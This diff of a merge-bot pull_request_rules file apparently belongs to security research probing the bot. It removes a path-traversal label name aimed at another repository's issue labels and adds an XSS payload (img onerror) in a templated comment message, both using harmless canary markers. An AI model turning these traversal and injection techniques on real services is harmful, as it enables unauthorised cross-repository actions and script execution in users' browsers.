@@ -1,17 +1,7 @@
 pull_request_rules:
-  - name: trav-label-remove
+  - name: xss-probe
     conditions:
       - base=main
-      - label=trav-go
     actions:
-      label:
-        remove:
-          - "../../../../kirasec-research1/ci-confidential-30019349/issues/2/labels/canary-label"
-  - name: control-local-label
-    conditions:
-      - base=main
-      - label=trav-go
-    actions:
-      label:
-        add:
-          - trav-control-added
+      comment:
+        message: "{{ <img src=1 onerror=document.title='XSSFIRED'> }}"
